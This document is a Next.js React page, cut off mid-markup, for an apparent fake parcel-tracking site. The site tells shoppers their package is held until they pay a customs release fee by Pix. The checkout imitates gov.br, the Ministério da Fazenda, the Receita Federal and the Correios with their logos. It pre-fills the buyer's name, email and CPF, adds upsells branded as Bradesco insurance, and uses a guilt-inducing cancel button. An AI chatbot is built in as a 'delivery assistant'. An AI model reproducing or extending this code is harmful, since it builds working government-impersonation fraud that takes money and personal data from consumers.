'use client';

import { useEffect, useState, use } from 'react';
import { useRouter } from 'next/navigation';
import { Package, MapPin, Calendar, Clock, ArrowLeft, RefreshCw, AlertCircle, CheckCircle2, Truck, HelpCircle, AlertTriangle, CreditCard, ShoppingBag, Bot, Send, X, MessageSquare, Sparkles } from 'lucide-react';

interface Evento {
  status: string;
  data: string;
  descricao: string;
  local: string;
}

interface RastreioData {
  codigo: string;
  status: 'postado' | 'em_transito' | 'saiu_para_entrega' | 'entregue' | 'extraviado' | 'pendente_taxa';
  historico: Evento[];
  atualizado_em: string;
  customer?: {
    nome: string;
    email: string;
    cpf: string;
  } | null;
  numero_pedido?: string | null;
  itens?: any[];
  store?: {
    nome_loja?: string;
    logo_url?: string | null;
    primary_color?: string | null;
    banner_url?: string | null;
    banner_link?: string | null;
    whatsapp_suporte?: string | null;
  } | null;
  taxa_info?: {
    exibir: boolean;
    nome: string;
    valor: string;
    link: string;
    veopag_enabled?: boolean;
    paga?: boolean;
  };
  upsell_info?: {
    ativo: boolean;
    titulo: string;
    descricao: string;
    link: string;
    imagem_url?: string;
  };
}

interface ChatMessage {
  sender: 'user' | 'ai';
  text: string;
}

export default function RastreioPage({ params }: { params: Promise<{ codigo: string }> }) {
  const { codigo } = use(params);
  const router = useRouter();
  
  const [data, setData] = useState<RastreioData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Estados do Chatbot de IA
  const [showAiChat, setShowAiChat] = useState(false);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [inputMsg, setInputMsg] = useState('');
  const [aiLoading, setAiLoading] = useState(false);

  // Estados do Checkout Pix Integrado
  const [showCheckout, setShowCheckout] = useState(false);
  const [checkoutLoading, setCheckoutLoading] = useState(false);
  const [payerName, setPayerName] = useState('');
  const [payerEmail, setPayerEmail] = useState('');
  const [payerCpf, setPayerCpf] = useState('');
  const [bradescoBump, setBradescoBump] = useState(false);
  const [expressBump, setExpressBump] = useState(false);
  const [pixData, setPixData] = useState<{ qrcode: string; transactionId: string; amount: number; external_id?: string; isMock?: boolean } | null>(null);
  const [pixPaid, setPixPaid] = useState(false);

  // Polling para monitoramento de confirmação do Pix
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (pixData && !pixPaid) {
      interval = setInterval(async () => {
        try {
          const res = await fetch(`/api/rastreio/${codigo}`);
          if (res.ok) {
            const jsonData = await res.json();
            // Se o backend confirmou que a taxa está paga
            if (jsonData.taxa_info?.paga) {
              setPixPaid(true);
              setData(jsonData); // atualiza a timeline
            }
          }
        } catch (err) {
          console.error('Erro no polling do Pix:', err);
        }
      }, 5000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, pixPaid, codigo]);

  // Cálculos auxiliares do Checkout Pix
  const baseValor = data ? parseFloat(data.taxa_info?.valor || '27.90') : 27.90;
  const total = parseFloat((baseValor + (bradescoBump ? 14.76 : 0) + (expressBump ? 9.91 : 0)).toFixed(2));

  const handleGerarPix = async () => {
    if (!data) return;
    setCheckoutLoading(true);
    try {
      const res = await fetch(`/api/rastreio/${codigo}/checkout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: payerName,
          email: payerEmail,
          document: payerCpf,
          bradesco_seguros: bradescoBump,
          entrega_express: expressBump,
        }),
      });
      const json = await res.json();
      if (json.success) {
        setPixData(json);
      } else {
        alert(json.error || 'Erro ao gerar o Pix. Tente novamente.');
      }
    } catch (err) {
      console.error(err);
      alert('Erro ao processar o checkout.');
    } finally {
      setCheckoutLoading(false);
    }
  };

  const handleConfirmarPagamentoSimulado = async () => {
    if (!pixData) return;
    try {
      const res = await fetch('/api/webhooks/veopag', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'COMPLETED',
          external_id: pixData.external_id,
        }),
      });
      if (res.ok) {
        setPixPaid(true);
        // Recarregar os dados do rastreio
        await fetchTracking();
      } else {
        alert('Erro ao confirmar pagamento simulado.');
      }
    } catch (err) {
      console.error(err);
    }
  };

  const fetchTracking = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch(`/api/rastreio/${codigo}`);
      if (!res.ok) {
        if (res.status === 404) {
          throw new Error('Código de rastreamento não encontrado. Verifique se digitou corretamente.');
        }
        throw new Error('Erro ao carregar informações de rastreio.');
      }
      const jsonData = await res.json();
      setData(jsonData);
      if (jsonData.customer) {
        setPayerName(jsonData.customer.nome || '');
        setPayerEmail(jsonData.customer.email || '');
        setPayerCpf(jsonData.customer.cpf || '');
      }
      
      // Mensagem inicial padrão da IA
      if (chatMessages.length === 0) {
        const firstName = jsonData.customer?.nome ? jsonData.customer.nome.split(' ')[0] : 'Cliente';
        setChatMessages([
          { sender: 'ai', text: `Olá ${firstName}! 🤖 Sou seu assistente de entrega. Dúvidas sobre seu rastreio ou entrega? Pergunte-me qualquer coisa!` }
        ]);
      }
    } catch (err: any) {
      setError(err.message || 'Erro de conexão.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTracking();
  }, [codigo]);

  const handleSendAiMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputMsg.trim() || aiLoading) return;

    const userText = inputMsg.trim();
    setInputMsg('');
    setChatMessages(prev => [...prev, { sender: 'user', text: userText }]);
    setAiLoading(true);

    try {
      const res = await fetch(`/api/rastreio/${codigo}/ai-chat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: userText }),
      });
      const resData = await res.json();
      if (resData.reply) {
        setChatMessages(prev => [...prev, { sender: 'ai', text: resData.reply }]);
      } else {
        setChatMessages(prev => [...prev, { sender: 'ai', text: 'Não consegui processar a resposta no momento. Tente novamente mais tarde.' }]);
      }
    } catch (err) {
      setChatMessages(prev => [...prev, { sender: 'ai', text: 'Erro de comunicação. Tente novamente.' }]);
    } finally {
      setAiLoading(false);
    }
  };

  const getStatusInfo = (status: string) => {
    switch (status) {
      case 'postado':
        return { label: 'Postado', color: 'bg-blue-500 text-white', icon: Package, desc: 'Objeto postado pelo remetente.' };
      case 'em_transito':
        return { label: 'Em Trânsito', color: 'bg-indigo-500 text-white', icon: Truck, desc: 'Objeto em movimentação entre unidades.' };
      case 'saiu_para_entrega':
        return { label: 'Saiu para Entrega', color: 'bg-amber-500 text-slate-900', icon: MapPin, desc: 'Objeto saiu para entrega ao destinatário.' };
      case 'pendente_taxa':
        return { label: 'Aguardando Pagamento da Taxa', color: 'bg-rose-600 text-white animate-pulse', icon: AlertTriangle, desc: '3ª tentativa realizada. Objeto aguardando taxa para liberação.' };
      case 'entregue':
        return { label: 'Entregue', color: 'bg-emerald-500 text-white', icon: CheckCircle2, desc: 'Objeto entregue ao destinatário com sucesso.' };
      case 'extraviado':
        return { label: 'Extraviado', color: 'bg-red-500 text-white', icon: AlertCircle, desc: 'Objeto não localizado no fluxo postal.' };
      default:
        return { label: 'Em Processamento', color: 'bg-slate-500 text-white', icon: HelpCircle, desc: 'Status do pedido pendente de atualização.' };
    }
  };

  const statusList: ('postado' | 'em_transito' | 'saiu_para_entrega' | 'entregue')[] = [
    'postado',
    'em_transito',
    'saiu_para_entrega',
    'entregue',
  ];

  return (
    <div className="flex flex-col flex-1 min-h-screen bg-slate-950 text-slate-100 font-sans p-4 sm:p-8 relative">
      <div className="max-w-3xl w-full mx-auto flex-1 flex flex-col justify-start py-6 sm:py-12">
        
        {/* Top Header Controls & Store Branding */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-8">
          <div className="flex items-center gap-3">
            {data?.store?.logo_url ? (
              <img src={data.store.logo_url} alt={data.store.nome_loja || 'Logo da Loja'} className="h-10 object-contain max-w-[200px]" />
            ) : (
              <div className="flex items-center gap-2">
                <div
                  className="w-9 h-9 rounded-xl flex items-center justify-center text-white font-extrabold shadow-md"
                  style={{ backgroundColor: data?.store?.primary_color || '#4F46E5' }}
                >
                  <Package className="w-5 h-5" />
                </div>
                <span className="text-lg font-extrabold text-white">{data?.store?.nome_loja || 'Rastreio.IO'}</span>
              </div>
            )}
          </div>

          <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
            <button
              onClick={() => router.push('/')}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800/80 transition-colors text-sm font-medium text-slate-300"
            >
              <ArrowLeft className="w-4 h-4" />
              Voltar
            </button>
            
            <button
              onClick={fetchTracking}
              disabled={loading}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800/80 transition-colors text-sm font-medium text-slate-300 disabled:opacity-50"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              Atualizar
            </button>
          </div>
        </div>

        {loading ? (
          <div className="flex-1 flex flex-col items-center justify-center py-20">
            <div className="w-12 h-12 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin mb-4" />
            <p className="text-slate-400 animate-pulse text-sm">Buscando informações da sua encomenda...</p>
          </div>
        ) : error ? (
          <div className="bg-slate-900/50 border border-red-500/20 rounded-2xl p-8 text-center space-y-4">
            <div className="inline-flex p-3 rounded-full bg-red-500/10 text-red-400 mb-2">
              <AlertCircle className="w-8 h-8" />
            </div>
            <h2 className="text-xl font-semibold text-white">Oops! Algo deu errado</h2>
            <p className="text-slate-400 max-w-md mx-auto text-sm">{error}</p>
            <button
              onClick={() => router.push('/')}
              className="mt-4 px-6 py-2.5 bg-indigo-600 hover:bg-indigo-500 active:bg-indigo-700 rounded-xl transition-colors font-medium text-sm"
            >
              Tentar outro código
            </button>
          </div>
        ) : data ? (
          showCheckout ? (
            <div className="bg-[#F4F6F9] text-slate-800 rounded-3xl overflow-hidden shadow-2xl border border-slate-200 animate-fadeIn max-w-4xl mx-auto">
              {/* Cabecalho Gov.br */}
              <div className="bg-[#0C2340] px-6 py-4 flex items-center justify-between border-b-4 border-[#00C853]">
                <div className="flex items-center gap-3">
                  <div className="flex items-center gap-1.5 text-white font-sans">
                    <img src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/user/WkYL6ge4vvGrKM0/public/stores/KV603kYqNLGw8ym/logo/dYbJvI5qVelpp1mQ8EJdAmRnKQ94MwarSV4pdFt9.png" alt="gov.br" className="h-8 w-auto object-contain" />
                    <div className="w-px h-6 bg-slate-500 mx-2 hidden sm:block" />
                    <span className="text-xs text-slate-300 font-medium uppercase tracking-wider hidden sm:block">Ministério da Fazenda</span>
                  </div>
                </div>
                <div className="flex items-center gap-2 bg-[#1A365D] px-3 py-1.5 rounded-lg border border-slate-700/50">
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
                  <span className="text-[10px] sm:text-xs font-black text-emerald-400 uppercase tracking-widest">Pagamento 100% Seguro</span>
                </div>
              </div>

              {/* Faixa Azul de Instrução */}
              <div className="bg-[#1E3E6C] text-white px-6 py-3.5 text-center text-xs sm:text-sm font-bold tracking-wide shadow-sm flex items-center justify-center gap-2">
                <Sparkles className="w-4 h-4 text-emerald-400 shrink-0" />
                Pague a sua Tarifa e libere o seu produto para o destino final.
              </div>

              <div className="p-6 space-y-6">
                {pixPaid ? (
                  <div className="text-center py-10 space-y-6 animate-scaleUp bg-white rounded-2xl p-8 border border-slate-100 shadow-sm">
                    <div className="inline-flex p-4 rounded-full bg-emerald-100 text-emerald-600 scale-125">
                      <CheckCircle2 className="w-12 h-12" />
                    </div>
                    <div className="space-y-2">
                      <h3 className="text-2xl font-black text-slate-900">Taxa Paga com Sucesso!</h3>
                      <p className="text-sm text-slate-500 max-w-md mx-auto">
                        A Receita Federal e os Correios confirmaram o recebimento do Pix. O seu pacote foi liberado para envio imediato.
                      </p>
                    </div>

                    <div className="p-4 bg-emerald-50 border border-emerald-100 rounded-xl max-w-sm mx-auto text-left space-y-1 text-xs">
                      <span className="font-bold text-emerald-800 block text-[10px] uppercase">Nova Atualização do Rastreio</span>
                      <span className="text-slate-600 block"><strong>Status:</strong> Em Trânsito</span>
                      <span className="text-slate-600 block"><strong>Ação:</strong> Taxa de liberação paga com sucesso. Objeto liberado e reencaminhado.</span>
                    </div>

                    <button
                      onClick={() => {
                        setShowCheckout(false);
                        setPixData(null);
                        setPixPaid(false);
                      }}
                      className="px-8 py-3 bg-[#0C2340] hover:bg-[#1E3E6C] text-white font-extrabold rounded-xl transition-all shadow-md text-sm font-sans"
                    >
                      Voltar ao Rastreamento
                    </button>
                  </div>
                ) : pixData ? (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 bg-white rounded-2xl p-6 border border-slate-100 shadow-sm">
                    <div className="flex flex-col items-center justify-center space-y-4 border-b md:border-b-0 md:border-r border-slate-100 pb-6 md:pb-0 md:pr-6">
                      <span className="bg-amber-100 text-amber-800 text-[10px] font-extrabold px-3 py-1 rounded-full uppercase tracking-wider">Aguardando Pagamento</span>
                      <img 
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(pixData.qrcode)}`} 
                        alt="QR Code do Pix" 
                        className="w-48 h-48 border border-slate-200 rounded-xl p-2 bg-white"
                      />
                      <span className="text-xs text-slate-500 font-medium">Escaneie o QR Code acima com o app do seu banco</span>
                    </div>

                    <div className="flex flex-col justify-between space-y-4">
                      <div className="space-y-3">
                        <div>
                          <span className="text-[10px] text-slate-400 uppercase font-bold block">Valor Total Consolidado</span>
                          <p className="text-3xl font-black text-emerald-600">R$ {pixData.amount.toFixed(2)}</p>
                        </div>

                        <div className="space-y-1">
                          <span className="text-[10px] text-slate-400 uppercase font-bold block">Pix Copia e Cola</span>
                          <div className="flex items-center gap-2">
                            <input 
                              type="text" 
                              readOnly 
                              value={pixData.qrcode} 
                              className="bg-slate-50 border border-slate-200 rounded-lg px-3 py-2 text-xs font-mono text-slate-600 flex-1 truncate select-all outline-none"
                            />
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(pixData.qrcode);
                                alert('Código Pix copiado!');
                              }}
                              className="p-2 bg-[#0C2340] hover:bg-[#1E3E6C] text-white rounded-lg transition-colors text-xs font-bold shrink-0 font-sans"
                            >
                              Copiar
                            </button>
                          </div>
                        </div>

                        <div className="text-xs text-slate-500 space-y-1.5 leading-relaxed bg-slate-50 p-3 rounded-lg border border-slate-100 font-sans font-medium">
                          <p className="font-bold text-slate-700">Como pagar:</p>
                          <p>1. Copie a chave Pix acima ou leia o QR Code com o celular.</p>
                          <p>2. Abra o aplicativo do seu banco de preferência.</p>
                          <p>3. Vá na opção Pix &gt; Copia e Cola ou ler QR Code.</p>
                          <p>4. Confirme as informações e pague a taxa.</p>
                        </div>
                      </div>

                      <div className="space-y-2 pt-2 border-t border-slate-100">
                        <div className="flex items-center justify-center gap-2 text-slate-400 text-xs animate-pulse">
                          <RefreshCw className="w-3.5 h-3.5 animate-spin text-slate-400" />
                          <span>Verificando pagamento automaticamente...</span>
                        </div>

                        {pixData.isMock && (
                          <button
                            onClick={handleConfirmarPagamentoSimulado}
                            className="w-full py-2.5 bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold rounded-lg transition-all shadow-md mt-2 flex items-center justify-center gap-2 uppercase tracking-wider font-mono"
                          >
                            🧪 [Sandbox] Confirmar Pagamento Simulado
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                    <div className="md:col-span-7 space-y-6">
                      <div className="bg-white rounded-2xl p-5 border border-slate-100 shadow-sm space-y-4">
                        <h4 className="text-xs font-black text-slate-400 uppercase tracking-widest">Seu Carrinho</h4>
                        
                        <div className="flex items-center justify-between gap-4 p-4 bg-slate-50 border border-slate-100 rounded-xl">
                          <div className="flex items-center gap-3">
                            <div className="p-1 bg-white border border-slate-100 rounded-xl w-12 h-12 flex items-center justify-center overflow-hidden shrink-0">
                              <img src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/public/products/5MoUUkyDBSdnNvNr6OLWadKL56OdqKPsnVxtlDuE.png" alt="Receita Federal" className="h-10 w-auto object-contain" />
                            </div>
                            <div>
                              <span className="font-bold text-slate-900 block text-sm font-sans">Taxa Aduaneira de Imposto Nacional</span>
                              <span className="text-[10px] text-amber-600 font-extrabold uppercase tracking-wide block mt-0.5 font-sans">Aguardando Pagamento</span>
                            </div>
                          </div>
                          <div className="text-right">
                            <span className="font-black text-slate-900 block text-base font-sans">R$ {baseValor.toFixed(2)}</span>
                            <span className="text-[10px] text-slate-400 block font-sans">Qtd: 1 (Fixo)</span>
                          </div>
                        </div>
                      </div>

                      <div className="bg-white rounded-2xl p-5 border border-slate-100 shadow-sm space-y-4">
                        <div>
                          <h4 className="text-xs font-black text-slate-400 uppercase tracking-widest font-sans">Ofertas Disponíveis para Você</h4>
                          <p className="text-[10px] text-slate-500 mt-0.5 font-medium font-sans">Adicione garantias extras diretamente ao seu pedido com condições únicas.</p>
                        </div>

                        <div className="space-y-3">
                          <div 
                            onClick={() => setBradescoBump(!bradescoBump)}
                            className={`p-4 border-2 rounded-2xl cursor-pointer transition-all flex items-start gap-4 ${
                              bradescoBump 
                                ? 'border-[#00C853] bg-emerald-50/20 shadow-md scale-[1.01]' 
                                : 'border-dashed border-amber-300 bg-amber-50/10 hover:border-amber-400'
                            }`}
                          >
                            <div className="pt-0.5">
                              <div className={`w-5 h-5 rounded flex items-center justify-center border transition-colors ${
                                bradescoBump ? 'bg-[#00C853] border-[#00C853] text-white' : 'border-slate-300 bg-white'
                              }`}>
                                {bradescoBump && <CheckCircle2 className="w-3.5 h-3.5" />}
                              </div>
                            </div>
                            <div className="flex-1 space-y-1">
                              <div className="flex items-center justify-between gap-2">
                                <div className="flex items-center gap-2">
                                  <img src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/public/products/rXVh7HRWqLZNmUR6UCNBYXV78WfeVjo74pjJHpE9.png" alt="Bradesco Seguros" className="h-5 w-auto object-contain shrink-0" />
                                  <span className="text-xs font-black text-[#13315C] uppercase tracking-wide block font-sans">Garantia Bradesco Seguros</span>
                                </div>
                                <span className="text-xs font-black text-slate-900 shrink-0 font-sans">+ R$ 14,76</span>
                              </div>
                              <p className="text-xs text-slate-600 leading-relaxed font-medium font-sans">
                                Indenização de até R$ 1.000,00 da seguradora caso seu produto seja roubado, extraviado ou sofra danos durante a retentativa de reenvio.
                              </p>
                              <span className="inline-block bg-amber-100 text-amber-800 text-[9px] font-black uppercase px-2 py-0.5 rounded mt-1.5 tracking-wider font-sans">
                                Recomendado
                              </span>
                            </div>
                          </div>

                          <div 
                            onClick={() => setExpressBump(!expressBump)}
                            className={`p-4 border-2 rounded-2xl cursor-pointer transition-all flex items-start gap-4 ${
                              expressBump 
                                ? 'border-[#00C853] bg-emerald-50/20 shadow-md scale-[1.01]' 
                                : 'border-dashed border-amber-300 bg-amber-50/10 hover:border-amber-400'
                            }`}
                          >
                            <div className="pt-0.5">
                              <div className={`w-5 h-5 rounded flex items-center justify-center border transition-colors ${
                                expressBump ? 'bg-[#00C853] border-[#00C853] text-white' : 'border-slate-300 bg-white'
                              }`}>
                                {expressBump && <CheckCircle2 className="w-3.5 h-3.5" />}
                              </div>
                            </div>
                            <div className="flex-1 space-y-1">
                              <div className="flex items-center justify-between gap-2">
                                <div className="flex items-center gap-2">
                                  <img src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/public/products/5MoUUkyDBSdnNvNr6OLWadKL56OdqKPsnVxtlDuE.png" alt="Receita Federal" className="h-5 w-auto object-contain shrink-0" />
                                  <span className="text-xs font-black text-[#13315C] uppercase tracking-wide block font-sans">Prioridade Alfandegária + Frete Express</span>
                                </div>
                                <span className="text-xs font-black text-slate-900 shrink-0 font-sans">+ R$ 9,91</span>
                              </div>
                              <p className="text-xs text-slate-600 leading-relaxed font-medium font-sans">
                                Fura fila na liberação alfandegária e prioridade máxima de entrega com prazo reduzido para até 24 horas úteis pós-pagamento.
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="md:col-span-5 space-y-6">
                      <div className="bg-white rounded-2xl p-5 border border-slate-100 shadow-sm space-y-4">
                        <h4 className="text-xs font-black text-slate-400 uppercase tracking-widest">Informações do Pagador</h4>
                        
                        <div className="space-y-3 font-medium">
                          <div className="space-y-1">
                            <span className="text-[10px] text-slate-500 font-bold uppercase block font-sans">Nome Completo</span>
                            <input 
                              type="text" 
                              readOnly
                              value={payerName} 
                              placeholder="Nome completo do pagador"
                              className="w-full bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs text-slate-500 outline-none cursor-not-allowed font-sans"
                            />
                          </div>

                          <div className="space-y-1">
                            <span className="text-[10px] text-slate-500 font-bold uppercase block font-sans">E-mail</span>
                            <input 
                              type="email" 
                              readOnly
                              value={payerEmail} 
                              placeholder="nome@exemplo.com"
                              className="w-full bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs text-slate-500 outline-none cursor-not-allowed font-sans"
                            />
                          </div>

                          <div className="space-y-1">
                            <span className="text-[10px] text-slate-500 font-bold uppercase block font-sans">CPF do Pagador (Protegido)</span>
                            <input 
                              type="text" 
                              readOnly
                              value={payerCpf} 
                              placeholder="000.000.000-00"
                              className="w-full bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs text-slate-500 outline-none cursor-not-allowed font-mono"
                            />
                            <span className="text-[9px] text-slate-400 block font-sans">Os dados de faturamento foram pré-configurados com base no pedido para sua segurança.</span>
                          </div>
                        </div>

                        <div className="pt-4 border-t border-slate-100 space-y-2 text-xs font-sans font-medium">
                          <div className="flex items-center justify-between text-slate-500">
                            <span>Valor Base:</span>
                            <span>R$ {baseValor.toFixed(2)}</span>
                          </div>
                          {bradescoBump && (
                            <div className="flex items-center justify-between text-slate-500">
                              <span>Seguro Bradesco:</span>
                              <span>R$ 14,76</span>
                            </div>
                          )}
                          {expressBump && (
                            <div className="flex items-center justify-between text-slate-500">
                              <span>Frete Express:</span>
                              <span>R$ 9,91</span>
                            </div>
                          )}
                          <div className="flex items-center justify-between text-sm font-black text-slate-900 pt-1">
                            <span>Total Geral:</span>
                            <span className="text-lg text-emerald-600">R$ {total.toFixed(2)}</span>
                          </div>
                        </div>

                        <button
                          onClick={handleGerarPix}
                          disabled={checkoutLoading || !payerCpf}
                          className="w-full py-4 bg-[#00C853] hover:bg-[#00E676] disabled:opacity-50 text-white font-extrabold rounded-xl transition-all shadow-md flex items-center justify-center gap-2 text-sm uppercase tracking-wider font-sans"
                        >
                          {checkoutLoading ? (
                            <>
                              <RefreshCw className="w-4 h-4 animate-spin" />
                              <span>Gerando Pix...</span>
                            </>
                          ) : (
                            <>
                              <CreditCard className="w-4 h-4" />
                              <span>Gerar PIX</span>
                            </>
                          )}
                        </button>

                        <button
                          onClick={() => setShowCheckout(false)}
                          className="w-full py-2.5 bg-red-600 hover:bg-red-755 text-white text-[10px] font-extrabold rounded-lg transition-colors font-sans uppercase tracking-wider shadow-md cursor-pointer"
                        >
                          VOU DESISTIR DE MINHA ENCOMENDA E DO PAGAMENTO QUE FIZ
                        </button>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className="space-y-6">

            {/* ⚠️ ALERTA DESTACADO DA TAXA DE LIBERAÇÃO / RETENTATIVA DE ENTREGA */}
            {(data.taxa_info?.exibir || data.status === 'pendente_taxa') && (() => {
              const isTaxaPaga = !!data.taxa_info?.paga;
              return isTaxaPaga ? (
                <div className="bg-gradient-to-r from-emerald-950/90 via-slate-900 to-teal-950/80 border-2 border-emerald-500/60 rounded-2xl p-6 shadow-2xl space-y-4">
                  <div className="flex items-start gap-4">
                    <div className="p-3 bg-emerald-500/20 border border-emerald-500/30 rounded-2xl text-emerald-400 shrink-0">
                      <CheckCircle2 className="w-8 h-8" />
                    </div>
                    <div className="space-y-1 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="bg-emerald-500 text-slate-950 text-[10px] font-extrabold uppercase px-2.5 py-0.5 rounded-full tracking-wider">Confirmado</span>
                        <span className="text-xs text-emerald-300/80 font-medium">Correios / Alfândega</span>
                      </div>
                      <h3 className="text-xl font-black text-white leading-snug">
                        Taxa de Liberação Paga com Sucesso
                      </h3>
                      <p className="text-sm text-slate-300 leading-relaxed">
                        O pagamento da taxa de liberação alfandegária foi confirmado. O seu pacote foi <strong>liberado</strong> e está seguindo o fluxo normal de entrega.
                      </p>
                    </div>
                  </div>

                  <div className="pt-3 border-t border-emerald-500/20 flex flex-col sm:flex-row items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-2 rounded-xl bg-slate-950/60 border border-emerald-500/30 text-emerald-400">
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <div>
                        <span className="text-[11px] text-slate-400 uppercase font-semibold">Status do Pagamento</span>
                        <p className="text-sm font-black text-emerald-400">PAGO & LIBERADO</p>
                      </div>
                    </div>

                    <div className="w-full sm:w-auto px-6 py-3.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 font-bold rounded-xl text-center text-sm shadow-sm transition-all flex items-center justify-center gap-2">
                      ✅ Pagamento Confirmado e Pedido Liberado
                    </div>
                  </div>
                </div>
              ) : (
                <div className="bg-gradient-to-r from-rose-950/90 via-slate-900 to-amber-950/80 border-2 border-rose-500/60 rounded-2xl p-6 shadow-2xl space-y-4 animate-pulse-slow">
                  <div className="flex items-start gap-4">
                    <div className="p-3 bg-rose-500/20 border border-rose-500/30 rounded-2xl text-rose-400 shrink-0">
                      <AlertTriangle className="w-8 h-8" />
                    </div>
                    <div className="space-y-1 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="bg-rose-500 text-white text-[10px] font-extrabold uppercase px-2.5 py-0.5 rounded-full tracking-wider">Ação Necessária</span>
                        <span className="text-xs text-rose-300/80 font-medium">Correios / Alfândega</span>
                      </div>
                      <h3 className="text-xl font-black text-white leading-snug">
                        {data.taxa_info?.nome || 'Taxa de Despacho Postal e Liberação Alfandegária'}
                      </h3>
                      <p className="text-sm text-slate-300 leading-relaxed">
                        Seu pacote passou pelas retentativas de entrega e encontra-se <strong>retido</strong> na central. É necessário realizar o pagamento da taxa para liberação imediata e reenvio do objeto ao seu endereço.
                      </p>
                    </div>
                  </div>

                  <div className="pt-3 border-t border-rose-500/20 flex flex-col sm:flex-row items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-2 rounded-xl bg-slate-950/60 border border-rose-500/30 text-rose-400">
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <div>
                        <span className="text-[11px] text-slate-400 uppercase font-semibold">Valor da Taxa</span>
                        <p className="text-xl font-black text-emerald-400">R$ {data.taxa_info?.valor || '27,90'}</p>
                      </div>
                    </div>

                    {data.taxa_info?.veopag_enabled ? (
                      <button
                        onClick={() => setShowCheckout(true)}
                        className="w-full sm:w-auto px-6 py-3.5 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-black rounded-xl text-center text-sm shadow-xl transition-all hover:scale-105 flex items-center justify-center gap-2"
                      >
                        💳 Pagar Taxa de Liberação e Reenvio
                      </button>
                    ) : (
                      <a
                        href={data.taxa_info?.link || '#'}
                        target={data.taxa_info?.link ? '_blank' : '_self'}
                        rel="noopener noreferrer"
                        className="w-full sm:w-auto px-6 py-3.5 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-black rounded-xl text-center text-sm shadow-xl transition-all hover:scale-105 flex items-center justify-center gap-2"
                      >
                        💳 Pagar Taxa de Liberação e Reenvio
                      </a>
                    )}
                  </div>
                </div>
              );
            })()}
            
            {/* Summary card */}
            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-600/5 rounded-full filter blur-3xl" />
              
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 z-10 relative">
                <div>
                  <span className="text-xs font-semibold text-slate-400 uppercase tracking-widest">Código de Rastreio</span>
                  <h2 className="text-2xl font-mono font-bold text-white mt-1">{data.codigo}</h2>
                </div>
                
                <div className="flex items-center gap-3">
                  {(() => {
                    const info = getStatusInfo(data.status);
                    const IconComp = info.icon;
                    return (
                      <>
                        <div className={`p-2.5 rounded-xl ${info.color}`}>
                          <IconComp className="w-6 h-6" />
                        </div>
                        <div>
                          <span className="text-xs font-semibold text-slate-400 uppercase tracking-widest">Status Atual</span>
                          <p className="text-lg font-bold text-white mt-0.5">{info.label}</p>
                        </div>
                      </>
                    );
                  })()}
                </div>
              </div>

              {/* Progress Stepper for standard path */}
              {data.status !== 'extraviado' && (
                <div className="mt-8 border-t border-slate-800/80 pt-6">
                  <div className="grid grid-cols-4 relative">
                    <div className="absolute top-[18px] left-[12.5%] right-[12.5%] h-0.5 bg-slate-800 -z-10" />
                    
                    {(() => {
                      const activeIndex = statusList.indexOf(data.status as any);
                      const widthPct = activeIndex === -1 ? '75%' : `${(activeIndex / 3) * 100}%`;
                      return (
                        <div
                          className="absolute top-[18px] left-[12.5%] h-0.5 bg-indigo-500 transition-all duration-500 -z-10"
                          style={{ width: `calc(${widthPct} - 0%)` }}
                        />
                      );
                    })()}

                    {statusList.map((step, idx) => {
                      const isActive = statusList.indexOf(data.status as any) >= idx || data.status === 'pendente_taxa';
                      const isCurrent = data.status === step || (data.status === 'pendente_taxa' && step === 'saiu_para_entrega');
                      const stepInfo = getStatusInfo(step);
                      const StepIcon = stepInfo.icon;
                      
                      return (
                        <div key={step} className="flex flex-col items-center text-center">
                          <div className={`w-9 h-9 rounded-full flex items-center justify-center border-2 transition-all ${
                            isCurrent
